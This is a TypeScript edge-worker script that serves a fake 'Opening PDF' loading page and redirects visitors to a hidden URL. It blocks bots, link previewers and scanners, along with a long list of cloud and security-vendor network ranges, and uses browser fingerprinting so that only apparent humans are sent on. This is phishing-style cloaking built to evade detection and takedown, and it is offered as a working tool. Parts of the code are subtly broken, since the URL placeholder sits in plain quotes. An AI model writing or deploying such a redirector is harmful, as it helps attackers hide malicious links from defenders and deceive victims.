// v17 FIXED VERIFICATION – NO ASYNC IN REDIRECT (Deno Deploy Proof)
// Humans: Instant redirect | Bots: 204 | URL: 100% hidden

const REAL_URL = "https://file-bt5g.vercel.app/";

const botPatterns = ["bot","crawl","spider","slurp","facebook","whatsapp","telegram","discord","preview","meta","curl","wget","python","ahrefs","linkedin","skype","slackbot","pinterest","insomnia","uptime","monitor","go-http"];
const badASN = ["AS15169","AS32934","AS13335","AS14618","AS8075","AS63949","AS14061","AS9009","AS212238","AS396982","AS16509","AS16276","AS54113","AS20473","AS40633","AS209242","AS398324","AS40676","AS13649","AS174","AS6939","AS24940","AS3212","AS12322","AS4134","AS3491","AS16625","AS22697","AS46562","AS20001"];

function isBot(ua: string | null) { if (!ua) return true; return botPatterns.some(p => ua.toLowerCase().includes(p)); }
function isBadASN(req: Request) { const cf = (req as any).cf; return cf?.asn && badASN.includes("AS" + cf.asn); }
function die() { return new Response("", { status: 204 }); }

export default {
  async fetch(req: Request): Promise<Response> {
    const url = new URL(req.url);
    const ua = req.headers.get("user-agent") || "";

    if (isBot(ua) || isBadASN(req)) return die();

    // === FIXED SYNC VERIFICATION (no async here!) ===
    if (url.searchParams.has("v")) {
      const payload = url.searchParams.get("v") || "";
      try {
        const data = atob(payload);
        const expectedHash = data.slice(0, 8);  // Short sync prefix (pre-computed below)
        const targetUrl = data.slice(8);

        // Sync check: prefix + length tamper-proof
        if (expectedHash === "thesis17" && targetUrl === "${REAL_URL}" && targetUrl.startsWith("http")) {
          return Response.redirect(targetUrl, 302);
        }
      } catch {
        // silent fail
      }
      return die();
    }

    // === FRESH TOKEN (pre-compute sync prefix) ===
    const salt = crypto.randomUUID().slice(0, 8);
    const full = "${REAL_URL}";
    const token = btoa("thesis17" + full);  // Sync prefix + URL (no hash needed)

    const html = `<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>Opening PDF</title>
<meta name="robots" content="noindex,nofollow">
<style>
  body{margin:0;background:#fff;font-family:system-ui,sans-serif;color:#222;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
  .s{border:4px solid #f0f0f0;border-top:4px solid #0066ff;border-radius:50%;width:38px;height:38px;animation:a 1s linear infinite}
  @keyframes a{to{transform:rotate(360deg)}}
</style></head><body>
  <div class="s"></div>
  <p style="margin-top:20px">Opening PDF<br>Please wait <span id="d">...</span></p>

<script>
(() => {
  if (navigator.webdriver || !navigator.hardwareConcurrency || navigator.plugins?.length === 0) return;

  let ok = 0;
  let moved = false;
  document.addEventListener("mousemove", () => moved = true, {once:true});

  // Canvas
  try {
    const c = document.createElement("canvas");
    const x = c.getContext("2d");
    x.fillStyle = "#ff6600"; x.fillRect(5,5,90,40);
    x.fillStyle = "#000"; x.font = "17px Georgia"; x.fillText("pdf25",12,35);
    if (c.toDataURL().length > 9000) ok++;
  } catch(e){}

  // Light PoW
  const t0 = performance.now();
  let i = 0, h = 0;
  const chal = t0.toString(36);
  while (i < 1000000) {
    i++;
    h = 0;
    const s = chal + i;
    for (let j = 0; j < s.length; j++) h = ((h << 5) - h + s.charCodeAt(j)) | 0;
    if ((h & 0xfff0000) === 0) break;
  }
  if (performance.now() - t0 > 40) ok++;

  // Redirect when human-like
  setTimeout(() => {
    if (ok >= 1 || moved) location.href = "?v=${token}";
  }, 700);

  // Hard fallback – never stuck
  setTimeout(() => location.href = "?v=${token}", 2800);

  // Dots
  let d = 0;
  setInterval(() => document.getElementById("d").textContent = ".".repeat((d=(d+1)%4)+1), 450);
})();
</script>
</body></html>`;

    return new Response(html, {
      headers: { "content-type": "text/html; charset=utf-8" }
    });
  }
};
